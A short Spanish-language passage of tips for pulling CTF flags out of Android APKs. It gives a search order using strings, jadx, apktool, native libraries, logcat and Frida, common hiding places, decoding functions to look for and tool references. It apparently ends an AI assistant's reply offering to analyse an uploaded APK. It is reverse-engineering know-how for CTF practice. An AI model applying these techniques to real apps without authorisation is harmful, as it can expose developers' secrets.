### **Notas adicionales**

- **Orden de búsqueda recomendado:** `strings` rápido → `jadx` (Java) → `apktool` (smali + recursos) → libs nativas → runtime (`adb logcat` / frida).
    
- Si el APK está **ofuscado** (nombres raros), buscar constantes/texto es la forma más rápida.
    
- Muchos CTFs esconden la flag en: `res/values/strings.xml`, `assets/`, `shared_prefs/`, `native .so strings`, o construida dinámicamente y registrada en logs.
    
- Si encuentras blobs base64/hex pero no clave, busca funciones que las decodifiquen: `Base64.decode`, `new String(decrypt(...))`, o `Cipher.getInstance(...)`.
    
- Si quieres, sube el APK aquí y lo analizo: te devuelvo la **flag exacta**, el **archivo/archivo-java/offset** donde estaba y el **comando** que la sacó (todo corto).
    

---

### **Referencias**

- Jadx — decompilar APK a Java (`jadx` / `jadx-gui`).
    
- Apktool — decompilar a smali y recursos (`apktool d`).
    
- Frida — instrumentación dinámica.
    
- adb / logcat — ejecutar en emulador y ver logs.
    
- Herramientas adicionales: `strings`, `radare2`, `Ghidra` (native .so).